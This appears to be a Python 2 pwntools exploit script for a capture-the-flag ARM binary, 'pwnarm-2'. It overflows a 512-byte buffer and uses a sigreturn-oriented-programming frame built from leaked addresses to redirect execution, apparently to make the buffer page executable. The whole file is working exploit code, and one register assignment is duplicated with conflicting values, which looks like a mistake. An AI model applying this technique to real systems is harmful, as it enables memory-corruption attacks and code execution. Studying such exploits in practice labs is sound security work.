from pwn import *
import Frame
import time

context.arch = "arm"

def myhexdump(a_string):
	from struct import unpack
	i = 0
	line = ""
	while True:
		data = a_string[i*4: (i*4)+4]
		if not data: break
		line += "%08x " % (unpack("<I", (data))[0])
		i += 1
		if i % 4 == 0:
			print line
			line = ""

p = process("./pwnarm-2")

buf = int(p.recvline().strip().split(" = ")[1], 16)
function = int(p.recvline().strip().split(" = ")[1], 16)
log.info("Buffer=%x Function=%x" %(buf, function))

time.sleep(10)

SIGRETURN = function + 8
SVC = function + 12

buffer_page = buf & ~(4096 - 1)

sploit  = ""
sploit += "A" * 512
sploit += pack(buf)
sploit += pack(SIGRETURN)

frame = Frame.SigreturnFrame(arch="arm")
frame.set_regvalue("uc_flags", 0x5ac3c35a)
frame.set_regvalue("trap_no", 0x7)
frame.set_regvalue("r0", buffer_page)
frame.set_regvalue("r1", 0x1000)
frame.set_regvalue("r2", 0x7)
frame.set_regvalue("r2", 0x8)
frame.set_regvalue("r8", buffer_page)
frame.set_regvalue("r10", buffer_page)
frame.set_regvalue("fp", buffer_page)
frame.set_regvalue("ip", 0x7fffffff)
frame.set_regvalue("sp", buffer_page)
frame.set_regvalue("lr", buffer_page)
frame.set_regvalue("pc", SVC)
frame.set_regvalue("cpsr", 0x60000010)
f = frame.get_frame()
myhexdump(f)
sploit += f

p.sendline(sploit)

raw_input()
